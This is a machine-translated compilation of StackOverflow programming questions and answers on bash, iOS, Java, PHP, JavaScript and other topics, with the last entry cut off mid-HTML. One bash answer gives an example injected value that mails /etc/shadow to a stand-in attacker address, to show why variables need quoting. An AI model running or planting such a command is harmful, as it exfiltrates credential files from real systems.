# StackOverflow 问答 13271000-13271999

# bash - awk 的 shell 脚本没有提供所需的输出

> ID：13271003
> 
> 赞同：1
> 
> 时间：2012-11-07T13:41:11.727
> 
> 标签：bash, shell, sh

```
#!/bin/bash

index=101,102,103,104,105
/bin/echo "$index" | /bin/awk -F\, '{print $2}' 
```

上面是我的shell脚本，（这只是一个演示它不应该是静态的）当我执行它时它返回值“102”它是正确的。

```
 #!/bin/bash

index=101,102,103,104,105

for i in 1 2 3 4 5
do
/bin/echo "$index" | /bin/awk -F\, '{print $i}'
done 
```

我想一一打印所有数字……我错在哪里？

我已经用“null” saprated 值做了一些改变......现在我想做什么改变？获取和增加 $i 的值？

```
output of  *some command*
1013
1023
12324
13224
3122
2421

#!/bin/bash
index=*some command*
i=1

for LINE in ${OUTPUT} ; do
    ans=$(/bin/echo "$index" | /bin/awk -vRS= -vFS="\n" '{print $i}')
    i=`expr $i + 1`
done 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T15:25:47.763

单引号不允许变量扩展。所以`"$i"`被扩展为 , 的值`$i`，但`'$i'`它是一个文字`$i`。

假设变量将在脚本中正确展开通常是不安全的。您不想将脚本放在双引号中。相反，使用 awk 的选项将 的值传递`$i`到 awk 脚本中。`-v`

```
#!/bin/bash

index=101,102,103,104,105

for i in 1 2 3 4 5; do
  echo "$index" | awk -F, -vi="$i" '{print $i}'
done 
```

由于这是一个示例，并且我不确定您是否*真的*会使用 for 循环来生成 的值`$i`，因此您应该记住将双引号括起来，`$i`这样如果它包含空格或其他奇怪的字符，您就不要' t 破坏您的脚本并意外执行您不想执行的操作。虽然它并不总是必要的，但*始终*建议在 bash 中引用您的变量。小心≈好。如果`$i`要获得 的值`"1;mail h4x0r@example.net < /etc/shadow;true"`，那么您将处于危险之中，没有引号。带引号，你只是有一个失败的脚本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T13:44:08.370

您必须将 的值传递`i`给 awk：

```
#!/bin/bash

index=101,102,103,104,105

for i in 1 2 3 4 5
do
    /bin/echo "$index" | /bin/awk -v i=$i -F\, '{print $i}'
done 
```

否则，`i`脚本中的值对于 awk 是未知的，默认情况下它采用`0`. 所以它会像你说的那样打印`$0`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T13:50:10.547

或者像这样

```
#!/bin/bash

index=101,102,103,104,105

IFS=','
for x in $index
do
    echo "$x"
done 
```

IFS 将在您的情况下定义分隔符“，”。然后你可以遍历元素（如数组）

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-07T13:51:46.607

使用双引号，以便`$i`被 shell 扩展。然后，您必须引用美元符号以防止扩展`$$`：

```
awk -F, "{print \$$i}" 
```

# javascript - jQuery Masonry：repositon dom 元素，无论 dom 顺序如何？

> ID：13271005
> 
> 赞同：2
> 
> 时间：2012-11-07T13:41:13.317
> 
> 标签：javascript, jquery, plugins, jquery-masonry

这是我第一次使用 jQuery [Masonry 插件](http://masonry.desandro.com/)。

我遇到的问题是我正在使用两种尺寸的`.box`es。所以有一个基本尺寸`180x120px`和两倍的尺寸`360x240px`

为了解释我的问题，我快速制作了我目前正在开发的网站的模型。

![在此处输入图像描述](../Images/208e313c49f1211cbc373db18e557c22.png)

你可以在这里看到的是我已经使用砖石的网格。方框中的数字表示 DOM 中方框的顺序。

如您所见，由于 DOM 元素 nr5 是一个大框，因此右上角缺少一个“空格”。

**现在我的问题** 是否有可能（或者是否有砌体设置）以便在这种情况下 Nr.7 会浮动到右上角？我只是不想留下任何空间！

有任何想法吗？

我正在使用的代码是这样的……</p>

```
$wall.masonry({ 
          columnWidth: 180, 
          itemSelector: '.box:not(.invis)',
          animate: true,
            animationOptions: {
              duration: 650,
              easing: 'linear',
              singleMode: true,
              queue: true
            }
        }); 
```

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:00:43.537

如果可以解决您的问题，请尝试使用 wookmark jquery 插件。wookmark 插件与 masonry 相同，它也使用 bin-packing 算法。但我不认为砌体插件浪费空间，因为组合太多。这是一个 np 完整或难题。当你能在多项式时间内解决它时，你就是一个有钱人！？

# ios - 表视图中的 PushViewController

> ID：13271006
> 
> 赞同：0
> 
> 时间：2012-11-07T13:41:20.597
> 
> 标签：ios, uitableview, uinavigationcontroller, uitabbarcontroller

在我的应用程序中，我的根视图控制器是 TabBar 控制器之一中的 TabBar 我使用表格视图我想在按下到单元格时推送视图控制器但是当我使用

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
  TripDetailView * TripDetailViewObjec = [[TripDetailView alloc]init];
    [self.navigationController pushViewController:TripDetailViewObjec animated:YES];
} 
```

不做任何事情，因为`Self.navigation=null`

我尝试在 AppDelegate 中创建 UINavigationController

```
- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    AppDelegate * ApplicationDelegate =[[UIApplication sharedApplication]delegate];
        [[ApplicationDelegate Nav] pushViewController:TripDetailViewObjec animated:YES];
} 
```

我的 AppDelegate

```
@interface AppDelegate : UIResponder <UIApplicationDelegate>
{
    WeekendTrips * WeekendTripsObject ; 
    UINavigationController * Nav;
}

@property (strong, nonatomic) UIWindow *window;
@property (strong,nonatomic)   UINavigationController * Nav;
@end

@implementation AppDelegate
@synthesize Nav;

@synthesize window = _window;

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
    // Override point for customization after application launch.
WeekendTripsObject = [[WeekendTrips alloc]init];

    Nav=[[UINavigationController alloc]initWithRootViewController:WeekendTripsObject];
   [self.view addSubView Nav.view];
    return YES;
} 
```

这不起作用我能做什么？提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T13:47:22.723

您需要`UINavigationController`在您的 appdelegate 中创建一个实例。您需要在标签栏控制器的视图中添加导航栏。

如果您在 xib 中有标签栏，请将`UINavigationController`对象从库窗口拖到标签栏的树视图中。将导航控制器放在标签栏控制器内，然后将现有视图控制器拖到导航控制器内。

如果您以编程方式创建选项卡栏，则非常简单：

喜欢：

```
UIViewController *viewController1 = [[UIViewController alloc] initWithNibName:@"yournib1" bundle:nil];
UINavigationController *navigationcontroller = [[UINavigationController alloc] initWithRootViewController:viewController1];

UIViewController *viewController2 = [[UIViewController alloc] initWithNibName:@"yournib2" bundle:nil];

self.tabBarController = [[UITabBarController alloc] init];
self.tabBarController.viewControllers = [NSArray arrayWithObjects:navigationcontroller, viewController2, nil]; 
```

请参考本[教程](http://codenugget.org/how-to-embed-a-navigation-controller-inside-a)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T13:47:26.120

您需要使用 an**`UINaviatigationController`作为应用程序的根视图控制器，然后将第一个表视图添加**为导航控制器的导航根视图。然后，您可以使用 .push 推送其他表视图`[self.navigationController pushViewController:animated:]`。

# java - 不同时区的 Java 日期

> ID：13271007
> 
> 赞同：2
> 
> 时间：2012-11-07T13:41:30.210
> 
> 标签：java

我有一个`long`值“值”，其中我以毫秒为单位保存时间，如果我将系统的时区从`UTC +2:00`返回`UTC +13:00` `new Date(value)`不同的结果！

谁能告诉我为什么以及如何使它返回给定值的相同日期，即使我的时区不同？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-07T13:44:14.377

不，`Date`不会**返回**不同的结果。`Date`只是以毫秒为单位的时间包装，仅此而已。它并不真正了解时区、小时等。

然而！`Date.toString()`使用带有当前时区的公历打印日期。但即使时区不同，它仍然代表同一个*时间点*。

假设我有这个简单的程序：

```
new Date(1352296028515L).toString() 
```

通常它会打印（我住在 CET 时区）：

```
Wed Nov 07 14:47:08 CET 2012 
```

但我可以覆盖时区 ( `-Duser.timezone=EST`) 或在纽约运行程序以获得例如：

```
Wed Nov 07 08:47:08 EST 2012 
```

然而！请注意，这两个日期实际上代表相同的时间，即 13:47 UTC。

简而言之：冷静下来，一切都很好，这只是另一个远离的理由`java.util.Date`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T13:45:20.107

类`java.util.Date`本身对时区一无所知。自 01-01-1970, 00:00:00 GMT 以来，它是一个毫秒数的容器。

如果您`Date`通过简单地调用`toString()`（显式或隐式）来打印对象，则日期将被格式化为您的机器设置的时区。如果您将机器设置为另一个时区，打印的日期看起来会有所不同 - 但它仍然指的是同一时间。

如果要`Date`在特定时区打印对象的值，请使用`SimpleDateFormat`对象并在该对象上设置时区：

```
Date date = ...;

DateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss Z");

// Show the date in the UTC timezone
df.setTimeZone(TimeZone.getTimeZone("UTC"));

System.out.println(df.format(date)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T13:47:56.920

这就是时区的工作方式。例如东部时间是 8:46，加利福尼亚是 5:46。以这种方式处理时区的方法是让一切都基于中央服务器，我建议服务器使用 GMT。然后，您从用户那里获取他们的“真实”时区的偏好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-07T13:48:44.510

帮自己一个大忙，避免使用 Java Calendar / Date 类。我强烈推荐使用[Joda Time](http://joda-time.sourceforge.net/) - 它经过深思熟虑并且没有错误。

顺便说一句，您的代码没有任何问题 - 它只是根据当前的 TimeZone 以不同的方式打印结果。

# javascript - 什么会触发黑莓“内存不足”警告？

> ID：13271008
> 
> 赞同：5
> 
> 时间：2012-11-07T13:41:31.473
> 
> 标签：javascript, cordova, blackberry

我一直在开发 Blackberry Phonegap/Webworks 应用程序。如果我在 OS6 设备上的整个使用过程中观看它，它将开始使用约 1mb 的内存。当我使用该应用程序时，内存使用量会慢慢上升（假设是一个惰性垃圾收集器），然后通常当它达到 32mb 左右时，它会回落到 < 1mb。

如果我让应用程序在一夜之间打开，我会在第二天早上返回“内存不足警告”，建议我关闭我的应用程序。奇怪的是，我会在设置下查看，我的应用程序只使用了 ~1mb 的内存，并且设备有 200mb 的可用 RAM。我无法想象应用程序在没有 GC 启动的情况下会慢慢攀升至 200mb 的内存使用量。

该应用程序在后台 ping 服务器以获取文件，并响应推送通知，但在一两个小时内观看它似乎都没有显着增加内存（除了缓慢上升到 ~ 32mb 和 GC 下降到< 1mb)。

我想念的 BB 内存管理有什么奇怪的地方吗？该设备始终具有约 200mb 的可用 RAM，而且我从未见过我的应用程序接近使用该数量。但是如果我离开它几个小时，我会回到“内存警告”，但看到它的使用量约为 1mb。把我和一个客户逼上墙。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-03T09:52:57.617

这似乎是 BB OS6 的常见问题。我的 Webworks Blackberry 版本也遇到了同样的问题。我第一次开始使用该应用程序时运行良好，但是当我开始处理该应用程序上的其他页面时，我收到一个弹出窗口，告诉我“设备内存太低 - 请关闭以下项目”。然后应用程序图标变为看起来像一个通用文件夹的东西。之后我仍然可以使用该应用程序，并且在收到警告之前您可以使用该应用程序的时间并不总是一致的，即使像您一样，我发现内存使用量低于最小值

我做了一些研究，这似乎是 Blackberry OS 6 上的一个持续存在的问题。删除应用程序并重新安装它无济于事，重新启动应用程序也无济于事。

查看此链接以查看与低设备内存相关的更深层次问题

[http://supportforums.blackberry.com/t5/Web-and-WebWorks-Development/Device-memory-is-Low-issue-for-an-WebWork-app/td-p/1166441/page/16](http://supportforums.blackberry.com/t5/Web-and-WebWorks-Development/Device-memory-is-Low-issue-for-an-WebWork-app/td-p/1166441/page/16)

# drools - Drools 规则编写最佳实践

> ID：13271010
> 
> 赞同：5
> 
> 时间：2012-11-07T13:41:44.237
> 
> 标签：drools, rule-engine, rete

我一直在阅读一篇关于 Drools 性能的文章（[JBoss Drools – Performance and Memory Internals](http://xebee.xebia.in/2011/06/10/jboss-drools-performance-and-memory-internals/)），它解释了如何创建 Rete 树和节点，Drools 如何对它们进行索引，以及为什么 Drools 中对象数量的增加几乎不会影响执行的总时间它。以智能方式编写的规则可以大大减少 Rete Tree 中的节点数量，从而进一步提高性能。

我想知道是否有 Drools 规则编写最佳实践，所以我可以以一种可以尽可能快地执行它们的方式编写它们。

谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-08T20:49:55.270

我可以列举几个...

*   把最严格的条件放在最上面
*   在您的规则中使用相同的条件顺序
*   除非必须，否则不要使用 eval。
*   将评估放在条件的底部
*   不要在后果内使用 if 语句
*   在 Drools 5.4 上使用布尔值的快捷方式会导致 JIT 错误，所以不要使用`House ( windowOpen == true )`它们`House ( windowOpen )`
*   不要使用`salience`，在大多数情况下会导致维护地狱。

它当然不完整，只是我的 2 美分......

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-13T08:26:56.037

我最近才开始研究同样的问题，所以我可能不是回答这个问题的完美人选，但是，

*   您认为应该优先考虑的条件将它们放在首位
*   您使用的 then 条件应该非常努力地准备。
*   计划使用 Eclipse-Drool UI 创建好的规则
*   切勿尝试`if-statements`在 then 部分内使用
*   为布尔值使用快捷方式，因为它们经常会导致错误
*   始终遵循 RWTE 的模式，即 1\. RULE 2\. WHEN 3\. THEN 4\. END
*   避免使用显着性，它在大多数情况下会引起麻烦
*   尝试将规则与自定义类而不是预定义集集成以用于您的操作
*   您使用的条件何时部分应该是相互关联的而不是空的（即，条件应该链接到一些存在的值）。
*   正确使用 Import 语句...
*   绝对这个列表是永无止境的，所以不断更新自己.... :)

# objective-c - 使用 NSURLConnection 下载文件？

> ID：13271014
> 
> 赞同：1
> 
> 时间：2012-11-07T13:42:10.970
> 
> 标签：objective-c, ios, download, resume-download

我有一个 API 可以让我下载要下载的文件 URL。我正在使用`NSURLConnection`下载文件。文件大小可能有点大，因为它是 MP4。

## 代码步骤：

1.  使用我要从中恢复下载的字节索引进行初始化`NSMutableURLRequest`并添加到其中。`HttpHeaderField`（我这样做是因为互联网连接可能会丢失）。

2.  `NSURLConnection`用初始化`NSMutableURLRequest`。

3.  用于`connection:didReceiveData:`接收数据段并将其附加到全局`NSMutableData`对象。

4.  由于 Internet 问题，可能会生成错误消息，并使用`connection:didFailWithError:`. 在这个处理程序中，我`setText`下载状态标签带有消息“*没有互联网连接，或者很慢*”。睡眠 1 秒钟，然后再次返回到第一步。

## 代码：

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    [self resumeDownload];
}

- (void)resumeDownload
{
    NSURL *url = [NSURL URLWithString:video->videoUrl];
    NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:url];
    if (receivedData==nil)
    {
        receivedData = [[NSMutableData alloc] init];
    }
    else
    {
        NSString *range = [NSString stringWithFormat:@"bytes=%i-", receivedData.length];
        [request setValue:range forHTTPHeaderField:@"Range"];
    }

    downloadConnection = [[NSURLConnection alloc] initWithRequest:request delegate:self];
}

- (void)connection:(NSURLConnection *)connection didReceiveResponse:(NSURLResponse *)response
{
    NSLog(@"%@", [response description]);
}

- (void) connection:(NSURLConnection*)connection didFailWithError:(NSError*) error
{
    NSLog(@"Download Fail : %d", [error code]);
    [status setText:@"No internet conectivity or it is very slow."];
    sleep(1);
    [self resumeDownload];
}

- (void) connectionDidFinishLoading:(NSURLConnection*)connection
{
    // save the file
}

- (void) connection: (NSURLConnection*) connection didReceiveData: (NSData*) data
{
    if(connection == downloadConnection)
    {
        [receivedData appendData:data];
        [status setText:[NSString stringWithFormat:@"Downloading: %d Bytes.", receivedData.length]];
    }
} 
```

## 屏幕截图：

![在此处输入图像描述](../Images/ad117dc29f4aa124aa5413d0c91626b6.png) ![在此处输入图像描述](../Images/9d539a64bb6fd1e36f614173c2581ad3.png)

注意：当互联网重新连接时，下载将自动恢复。

这是解决问题的正确方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T13:53:56.437

总而言之 - 你在正确的道路上。
你应该检查你得到的错误类型——如果没有网络，再试一次也没有意义，你应该使用可达性测试来找出什么时候再试一次。
您还应该检查响应类型 - 4xx / 5xx 不会返回连接失败，即使这对您来说是失败的，例如 - 502 错误意味着您应该稍后再试，即使连接成功完成。
我会避免使用 sleep - 你阻塞了主线程。
使用 performSelector:withObject:afterDelay 或使用 NSTimer。
哦，一秒钟对我来说似乎太短了。

# php - 更改 array_walk 函数中的数组键？

> ID：13271015
> 
> 赞同：26
> 
> 时间：2012-11-07T13:42:17.807
> 
> 标签：php, arrays, function

我正在使用数组函数将我的管道分隔字符串转换为关联数组。

```
$piper = "|k=f|p=t|e=r|t=m|";

$piper = explode("|",$piper);

$piper = array_filter($piper);

function splitter(&$value,$key) {

    $splitted = explode("=",$value);
    $key = $splitted[0];
    $value = $splitted[1];

}

array_walk($piper, 'splitter');

var_dump($piper); 
```

这给了我

```
array (size=4)
  1 => string 'f' (length=1)
  2 => string 't' (length=1)
  3 => string 'r' (length=1)
  4 => string 'm' (length=1) 
```

我想要的地方：

```
array (size=4)
  "k" => string 'f' (length=1)
  "p" => string 't' (length=1)
  "e" => string 'r' (length=1)
  "t" => string 'm' (length=1) 
```

但钥匙没有改变。是否有任何数组函数可以让我循环遍历数组并更改键和值？

* * *

## 回答 #1

> 赞同：63
> 
> 时间：2012-11-07T13:45:57.887

在[**array_walk**](http://php.net/manual/en/function.array-walk.php)的文档中说（描述回调函数）：

> 只有数组的值可能会改变；它的结构不能改变，即程序员不能添加、取消设置或重新排序元素。如果回调不遵守此要求，则此函数的行为未定义且不可预测。

这意味着您不能使用`array_walk`更改迭代数组的键。但是，您可以使用它创建一个新数组：

```
$result = array();
array_walk($piper, function (&$value,$key) use (&$result) {
    $splitted = explode("=",$value);
    $result[ $splitted[0] ] = $splitted[1];
});
var_dump($result); 
```

* * *

不过，我想如果是我，我会在这里使用正则表达式（而不是“爆炸爆炸”）：

```
$piper = "|k=f|p=t|e=r|t=m|";
preg_match_all('#([^=|]*)=([^|]*)#', $piper, $matches, PREG_PATTERN_ORDER);
$piper = array_combine($matches[1], $matches[2]);
var_dump($piper); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-07T13:51:19.327

你可以更好地使用`foreach`它。以下示例显示了处理条目，使用右键添加它并删除原始条目。

```
$piper = "|k=f|p=t|e=r|t=m|";
$piper = array_filter(explode("|", $piper));

foreach ($piper as $index => $value) {
    list($key, $value) = explode("=", $value);
    $piper[$key] = $value;
    unset($piper[$index]);
} 
```

注意你没有像索引一样的键。

另一种选择是通过引用处理值并在之后设置键：

```
foreach ($piper as &$value) {
    list($keys[], $value) = explode("=", $value);
}
unset($value);

$piper = array_combine($keys, $piper); 
```

这不会给您带来任何麻烦，而只是使用重复的键。但是您可以在 之后检查该问题`foreach`，不会丢失任何数据。

以下内容无法保证，`foreach`这可能是通过输入结果数组最简化的方法：

```
$result = array();
foreach ($piper as $value) {
    list($key, $value) = explode("=", $value);
    $result[$key] = $value;
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-07T13:51:36.690

为什么不从 $piper 构建一个包含所需键和值的新数组呢？

```
$piper2 = array();
foreach ($piper as $k => $val)
{
  $splitted = explode("=", $val);
  $key = $splitted[0];
  $value = $splitted[1];

  $piper2[$key] = $value;
}

$piper = $piper2; // if needed 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-09-19T12:20:08.850

使用 array_reduce 就可以了

```
$piper = "|k=f|p=t|e=r|t=m|";

$piper = explode("|",$piper);

$piper = array_filter($piper);

function splitter($result, $item) {
    $splitted = explode("=",$item);
    $key = $splitted[0];
    $value = $splitted[1];

    $result[$key] = $value;

    return $result;
}

$piper = array_reduce($piper, 'splitter', array());

var_dump($piper); 
```

基于此：[http ://www.danielauener.com/howto-use-array_map-on-associative-arrays-to-change-values-and-keys/](http://www.danielauener.com/howto-use-array_map-on-associative-arrays-to-change-values-and-keys/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-08-23T08:18:21.607

这是我的递归函数，它不仅可以将数组的值更改为 array_walk_recursive() **，还可以更改给定数组的键**。它还保持数组的顺序： [https ://stackoverflow.com/a/57622225/10452175](https://stackoverflow.com/a/57622225/10452175)

# javascript - Javascript 根据另一个下拉列表的另一个值从数组中填充下拉列表：

> ID：13271027
> 
> 赞同：4
> 
> 时间：2012-11-07T13:43:04.737
> 
> 标签：javascript, dynamic-arrays

我有两个下拉菜单。第二个下拉列表应根据在第一个下拉列表中选择的“值”过滤数据。两个下拉列表都是从后端动态填充的

举例来说：第一个下拉列表您选择任何学生，下拉列表的值字段包含学生编号和基于所做的学生选择，第二个下拉列表应显示该特定学生的科目。要在下拉列表中显示的数据是从后端（大型机程序）添加的。我在以“*”分隔的第二个下拉数据的末尾添加了学生编号。在将数据传递到屏幕之前，我根据后端的学生编号对数据进行排序

这是我第一次尝试 html 和 javascript 代码更改（我是大型机开发人员）。因此我确信有一个更简单更好的解决方案。我们使用自动生成 HTML 的内部工具。我只需要提供 dropdown-ID ，会自动生成其他代码，例如“select”、“options”等。因此，从 dropdown2 过滤数据后，应该隐藏并显示一个新的下拉列表，其中不包含我添加的“学生编号”和“*”。

如果从第一个下拉列表中选择了 student1，则第二个 dropdwon 应显示主题 1 主题 2

```
 HTML
<div id="dropdrop1">
<select name="StudentC" size="1" onchange="Change()" id="studentCID">
<option value="ALL">All Students</option>
<option value="0123456789">0123456789 - Student 1</option>
<option value="0023456789">0023456789 - Student 2 </option>
</select> </div>

<div id="dropdown2">
<select name="StuclassC" size="1" id="StuclassCID">
<option value="ALL">All Class</option>
<option value="1111111111">1111111111 - Subject 1 0123456789</option>
<option value="2222222222">2222222222 - Subject 2 0123456789</option>
<option value="3333333333">3333333333 - Subject 3 0023456789</option>
<option value="4444444444">4444444444 - Subject 4 0023456789</option>

<select name=newdropdown  id= "newdropdown"></select> 
```

并且在此之后有一个搜索按钮，它填充了一个网格。

```
Javascript

    Change()
{
// text from  dropdown2
var aname = document.getElementById("StuclassCID");
var aopts = aname.options;
var adtext = new Array();
var advalue = new Array(); 
for(i = 0; i < aopts.length; i++)
{
    adtext.push(aopts[i].text);
    advalue.push(aopts[i].value);
}

//copy selected student no from dropdown1

var StuDD = document.getElementById("studentCID");
var Stuno = StuDD.options[StuDD.selectedIndex].value;

//Search for '*' in each string from dropdown2

var i,j,temp,Stunogreater;
var studrop = new Array();
var stunoa = new Array();
var showarray = new Array();
var showvalue = new Array();

var Stunogreater =False;

//Copying 'All Class' text dropdown2

 studrop.push(adtext[0]);

//separate the displayable portion from student no in the dropdown2

for (var i = 1; i < adtext.length; i++)
 {
     temp = adtext[i]; 
     var n=temp.indexOf("*");
     studrop.push(temp.substr(0, n-1));
     stunoa.push(temp.substr(n+1,10));
 }    

while( Stunogreater == False )
{
for(var j =0; j < studrop.length;j++)
 {
   if( stunoa[j] == stuno)    
     {
       showarray.push( studrop[j]);
       showvalue.push(stunoa[j]);
      }
   if (stunoa[j] > stuno)  Stunogreater = True;
  }
}         

//Copy text and value to show in a new dropdown

var sel = document.getElementById('newdropdown');
for(var i = 0; i < showarray.length; i++) {
    var opt = document.createElement('option');
    opt.innerHTML = showarray[i];
    opt.value = showvalue[i];
    sel.appendChild(opt);
} 
```

好吧，我不知道这段代码是否可以工作，因为文本环境目前要到下周才能使用。当用户点击搜索时，在 dropdown2 即最后一个下拉列表之后有一个搜索按钮。“值”字段中的数据被传递到后端以加载网格。所以基本上后端为每个下拉列表填充所有可能的值，当用户点击搜索时，每个 dropdwon 的“值”字段用于生成网格。

任何帮助都可以指导我以有效的方式执行此操作。请提供代码片段以及您的建议，因为我可能需要很长时间才能弄清楚您想说什么，因为我是前端新手语言。 **PS：我只能使用 HTML 和 Javascript（不能使用 Php、Jquery 和其他）。**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T15:58:46.583

如果您可以简单地隐藏未使用的值，则可以通过相对简单的检查来做到这一点：http: [//jsfiddle.net/MaxPRafferty/SEmwG/](http://jsfiddle.net/MaxPRafferty/SEmwG/) html：

```
<select id="dropdown1">
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
</select>

<select id="dropdown2">
<option>1</option>
<option>1</option>
<option>2</option>
<option>3</option>
</select>
​ 
```

CSS：

```
.hiddenElement{display:none;}​ 
```

js：

```
var dropdown1 = document.getElementById("dropdown1");
var dropdown2 = document.getElementById("dropdown2");
var change = function() {
    alert("here");
    for (var i = 0; i < dropdown2.length; i++) {
        if (dropdown2[i].value.indexOf(dropdown1.value) === -1) {
            dropdown2[i].className = "hiddenElement";
        }
        else {
            dropdown2[i].className = "";
        }
    }
}

dropdown1.onchange = change;​
​ 
```

# android - Arraylist 上的 OnItemLongClickListener

> ID：13271035
> 
> 赞同：0
> 
> 时间：2012-11-07T13:43:55.267
> 
> 标签：android, arraylist

嗨，我有数据数组列表。我想在数组列表`OnItemLongClickListener`的每个字段上实现。试图用`OnGestureListener`,

任何建议将不胜感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T13:46:46.153

您可以使用列表视图来完成。检查[http://developer.android.com/guide/topics/ui/layout/listview.html](http://developer.android.com/guide/topics/ui/layout/listview.html)

```
listView.setOnItemLongClickListener (new OnItemLongClickListener() {
  public boolean onItemLongClick(AdapterView parent, View view, int position, long id) {
    //do your stuff here
   }
}); 
```

# domain-driven-design - 值对象中的值对象 [DDD]

> ID：13271038
> 
> 赞同：5
> 
> 时间：2012-11-07T13:44:08.190
> 
> 标签：domain-driven-design

我在尝试理解如何使用值对象和聚合时遇到了一些困难。我将用一个例子来解释我的情况。

我有一个**名为**`Relationship`. 它保存诸如 ID 和 StartDate 之类的值。有两个**值对象**：`Boyfriend`和`Girlfriend`。男朋友和女朋友对象都有地址，所以我创建了另一个值对象`Address`。在数据库内部，这些都组合在一个表中（即 ID、StartDate、BoyfriendAddress、GirlfirendState 等）。

如何创建男朋友和女朋友？根据我对定义的理解，它们不符合聚合条件，因为它们没有根实体。一个值对象内部可以有另一个值对象吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-07T15:09:32.957

是的，您可以在其他值对象中包含值对象。我认为最简单的例子是 Money 类，它包含一个金额和一个 Currency，它是另一个 VO。

此外，如果 Boyfriend 和 Girlfriend 没有全局唯一 id，则它们不是**聚合根**，如果它们在关系中没有本地唯一标识，则它们也不是**实体**。

老实说，您的应用程序首先在政治上不正确:) - 因为存在[GLBT](http://en.wikipedia.org/wiki/LGBT)关系。第二，一个人（我假设你有他们的名字）不是一个实体或聚合根，这感觉很奇怪。

# asp.net-mvc - .NET 4.5 MVC RouteCollection.LowercaseUrls 在使用 Area 时中断

> ID：13271048
> 
> 赞同：17
> 
> 时间：2012-11-07T13:45:00.733
> 
> 标签：asp.net-mvc, asp.net-mvc-routing, asp.net-4.5

.NET Framework 4.5 向 RouteCollection 添加了一个新属性：

[http://msdn.microsoft.com/en-us/library/system.web.routing.routecollection.lowercaseurls.aspx](http://msdn.microsoft.com/en-us/library/system.web.routing.routecollection.lowercaseurls.aspx)

这很好用，直到您将区域添加到您的项目中。所有的 Url 都是正确的。

任何想法为什么会发生这种情况？重现很简单：

1.  创建新的 MVC 4 Internet 应用程序 (.NET 4.5)
2.  使用以下命令启动 RouteConfig.RegisterRoutes 函数： routes.LowercaseUrls = true;
3.  运行项目，你会看到所有生成的 Url 现在都是小写的。
4.  在项目中添加一个区域。
5.  再次运行该项目，您将看到所有 Url 再次都是正确的！

它在 context.MapRoute 在 AreaRegistration.RegisterArea 中执行时中断。当我将其注释掉时，我得到了小写的 Urls。取消注释它，正确的 Urls 又回来了。

在我看来，微软似乎知道这是错误的并且没有宣传这个新功能，因为它是一个非常棒的功能，但它只在 MSDN 文档中提到。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-12-06T23:22:06.367

这确实似乎是 ASP.NET MVC 和 ASP.NET 4.5 在路由中的新 LowercaseUrls 功能之间的交互中的错误。

我在这里记录了 MVC 的错误：http: [//aspnetwebstack.codeplex.com/workitem/685](http://aspnetwebstack.codeplex.com/workitem/685)

感谢您报告此事！

正如 Cristi Pufu 提到的，似乎其他人已经编写了一些 NuGet 包来处理类似的场景：

*   [http://nuget.org/packages/LowercaseRoutesMVC](http://nuget.org/packages/LowercaseRoutesMVC) - 添加对小写 URL 的支持
*   [http://nuget.org/packages/AttributeRouting](http://nuget.org/packages/AttributeRouting) - 为大量简洁的功能添加了超级精美的支持，包括小写 URL（请参阅[https://github.com/mccalltd/AttributeRouting/wiki/Generating-Lowercase-Outbound-URLs](https://github.com/mccalltd/AttributeRouting/wiki/Generating-Lowercase-Outbound-URLs)）

**编辑**2013 年 4 月 23 日 - 我们最近接受了一个拉取请求，其中修复了 ASP.NET MVC 5 的此问题。

# html - 内联显示一些 div

> ID：13271054
> 
> 赞同：1
> 
> 时间：2012-11-07T13:45:36.347
> 
> 标签：html, css, position

我无法在我的一个网站上显示一些 HTML 内联。有几个正方形我想内联。我试过使用`display: inline;`in css，但它没有成功。

这是它的样子： ![非内联的 div](../Images/6879f24da9b7e25a8cc2ccd3a7925224.png)

我想在一行中有两个这样的方格，所以每行可以有两个方格。

这是 HTML：

```
<!DOCTYPE html>
<html>
<head>
<link type="text/css" rel="stylesheet" href="./style/stylesheet.css" />
<link rel="icon" href="./style/images/favicon.png" type="image/x-icon">
<title>Bylmeti - Hyrja</title>
</head>
<body>
<div id="bylmeti">
    <div id="langs">
        <span class="small"><a href="index.php?lang=sq" id="lang_sq">SHQIP</a> | <a href="index.php?lang=en" id="lang_en">ENGLISH</a></span> 
    </div>

    <br /><br /> <br /><br /> <br /><br /> <br />

    <div id="top">
        <a href="index.php"><img src="style/images/logo_.gif" alt="Logo" id="logo" /></a>

        <ul id="menu">
            <li><a href="#produktet" id="produktet">Produktet</a></li>
            <li><a href="#kompania" id="kompania">Kompania</a></li>
            <li><a href="#referencat" id="referencat">Referencat</a></li>
            <li><a href="#blogu" id="blogu">Blogu</a></li>
